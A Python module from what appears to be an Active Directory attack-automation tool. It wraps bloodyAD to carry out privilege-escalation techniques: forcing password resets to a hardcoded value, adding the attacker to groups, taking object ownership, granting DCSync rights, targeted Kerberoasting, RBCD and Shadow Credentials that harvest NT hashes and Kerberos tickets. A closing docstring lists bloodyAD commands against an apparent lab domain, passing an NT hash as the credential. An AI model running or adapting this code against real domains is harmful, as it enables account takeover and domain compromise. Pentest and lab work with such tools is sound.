# services/ldap_techniques.py
from services.printing import print_done, print_info, print_warning
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from strategies.bloodyad_base import HARDCODED_PASSWORD
from utils.runner import SHADOW_CREDS_DIR

import os
import re

class ADTechniquesMixin:
    """
    Techniques that write to AD via LDAP (bloodyAD).
    Requires: self.edge, self.attacker, self.target, self._run_bloodyad()
    """
    # ──────────────────────────────────────────────────
    # 1. Force Change Password
    # ──────────────────────────────────────────────────
    def _do_force_change_password(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        new_password = HARDCODED_PASSWORD

        self._run_bloodyad(
            creds,
            ["set", "password", target_sam, new_password],
            "ForceChangePassword"
        )

        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=(
                f"Password reset for {target_sam}\n"
                f"Username: {target_sam}\n"
                f"Password: {new_password}\n"
                f"Domain: {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                password=new_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )

    # ──────────────────────────────────────────────────
    # 2. Add Member
    # ──────────────────────────────────────────────────
    def _do_add_member(self, creds: dict) -> ExploitResult:
        group_sam = self.target.sam()
        member_sam = self.attacker.sam()

        try:
            self._run_bloodyad(
                creds,
                ["add", "groupMember", group_sam, member_sam],
                "AddMember"
            )
        except HopFailedError as e:
            error_msg = str(e)
            if "entryAlreadyExists" in error_msg or "already a member" in error_msg:
                print_done(f"{member_sam} already a member of {group_sam} — OK")
                return ExploitResult(
                    technique="AddMember",
                    edge=self.edge,
                    success=True,
                    notes=f"{member_sam} already a member of {group_sam} (idempotent)",
                )
            raise  # re-raise if it's a different error

        print_done(f"{member_sam} added to {group_sam}")
        return ExploitResult(
            technique="AddMember",
            edge=self.edge,
            success=True,
            notes=f"{member_sam} added to {group_sam}",
        )
    
    # ──────────────────────────────────────────────────
    # 3. TakeOwnership
    # ──────────────────────────────────────────────────
    def _do_take_ownership(self, creds:dict) -> ExploitResult:
        attacker_sam = self.attacker.sam()
        target_sam = self.target.sam()

        output = self._run_bloodyad(
            creds,
            ["set", "owner", target_sam, attacker_sam],
            "TakeOwnership"
        )

        print_done(f"{attacker_sam} is now owner of {target_sam}")
        return ExploitResult(
            technique="TakeOwnership",
            edge=self.edge,
            success=True,
            notes=(
                f"{attacker_sam} is now owner of {target_sam}\n"
                f"Next: GrantGenericAll → full control"
            ),
        )
    
    # ──────────────────────────────────────────────────
    # 4. GrantDCSync (WriteDacl on Domain)
    # ──────────────────────────────────────────────────
    def _do_grant_dcsync(self, creds: dict) -> ExploitResult:
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "dcsync", attacker_sam],
            "GrantDCSync"
        )

        print_done(f"{attacker_sam} has now dcsync rights on {creds['domain']}")
        return ExploitResult(
            technique="GrantDCSync",
            edge=self.edge,
            success=True,
            notes=f"{attacker_sam} has now dcsync rights on {creds['domain']}",
        )

    # ──────────────────────────────────────────────────
    # 5. Targeted Kerberoast
    # ──────────────────────────────────────────────────
    def _do_targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        fake_spn = f"fake/roast.{creds['domain']}"

        self._run_bloodyad(
            creds,
            ["set", "object", target_sam, "servicePrincipalNames", fake_spn],
            "TargetedKerberoast"
        )

        print_done(f"SPN set on {target_sam}: {fake_spn}")
        return ExploitResult(
            technique="TargetedKerberoast",
            edge=self.edge,
            success=True,
            notes=f"SPN {fake_spn} added to {target_sam}; ready for Kerberoasting",
        )

    # ──────────────────────────────────────────────────
    # 6. RBCD
    # ──────────────────────────────────────────────────
    def _do_rbcd(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "rbcd", target_sam, attacker_sam],
            "RBCD"
        )

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(
            technique="RBCD",
            edge=self.edge,
            success=True,
            notes=f"RBCD configured: {attacker_sam} can impersonate against {target_sam}",
        )
    
    # ──────────────────────────────────────────────────
    # 7. Shadow Credentials
    # ──────────────────────────────────────────────────
    def _do_shadow_credentials(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()

        # Ensure tmp dir exists
        os.makedirs(SHADOW_CREDS_DIR, exist_ok=True)

        try:
            # Run bloodyAD with cwd=SHADOW_CREDS_DIR
            # so PFX is saved there directly
            output = self._run_bloodyad(
                creds,
                ["add", "shadowCredentials", target_sam],
                "ShadowCredentials",
                cwd=SHADOW_CREDS_DIR        # ← PFX lands here
            )
        except HopFailedError as e:
            error_msg = str(e)
            if "PKINIT" in error_msg or "PADATA_TYPE_NOSUPP" in error_msg:
                # Clean AD
                try:
                    self._run_bloodyad(
                        creds,
                        ["remove", "shadowCredentials", target_sam],
                        "ShadowCredentials cleanup",
                        cwd=SHADOW_CREDS_DIR
                    )
                except Exception:
                    pass

                # Clean local PFX — exact file from output
                self._cleanup_pfx_file(error_msg, SHADOW_CREDS_DIR)

                raise HopFailedError(
                    self.edge,
                    "ShadowCredentials: no PKINIT support (no CA enrolled). "
                    "Cleanup done."
                )
            raise

        parsed = self._parse_shadow_credentials_output(output)
        nt_hash = parsed.get("nt_hash", "")
        ccache = parsed.get("ccache", "")

        if not nt_hash and not ccache:
            self._cleanup_pfx_file(output, SHADOW_CREDS_DIR)
            raise HopFailedError(
                self.edge,
                "bloodyAD ran but could not parse NT hash or ccache"
            )

        # ccache is also in SHADOW_CREDS_DIR now
        ccache_path = os.path.join(SHADOW_CREDS_DIR, ccache)

        print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
        return ExploitResult(
            technique="ShadowCredentials",
            edge=self.edge,
            success=True,
            notes=(
                f"Shadow credentials added to {target_sam}\n"
                f"Username : {target_sam}\n"
                f"NT Hash  : {nt_hash}\n"
                f"TGT      : {ccache_path}\n"
                f"Domain   : {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                hash=f":{nt_hash}",
                ticket=ccache_path,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )

    def _cleanup_pfx_file(self, output: str, directory: str):
        """Remove only the specific PFX file from THIS attempt."""
        match = re.search(r"PFX certificate saved at:\s*(\S+\.pfx)", output)
        if match:
            pfx_name = os.path.basename(match.group(1))
            pfx_path = os.path.join(directory, pfx_name)
            if os.path.exists(pfx_path):
                try:
                    os.remove(pfx_path)
                    print_info(f"Cleaned up {pfx_path}")
                except OSError as e:
                    print_warning(f"Could not delete {pfx_path}: {e}")
            else:
                print_warning(f"PFX not found at expected path: {pfx_path}")
"""
# Quick check for ADCS in your domain
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
  get object "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local"

# Step 1: See what's on administrator's msDS-KeyCredentialLink
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
  get object administrator --attr msDS-KeyCredentialLink

# Step 2: Clean up ALL shadow credentials from previous tests
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
  remove shadowCredentials administrator

# Step 3: Verify it's clean
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
  get object administrator --attr msDS-KeyCredentialLink

# Step 4: Try shadow credentials fresh, watch carefully
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
  add shadowCredentials administrator

"""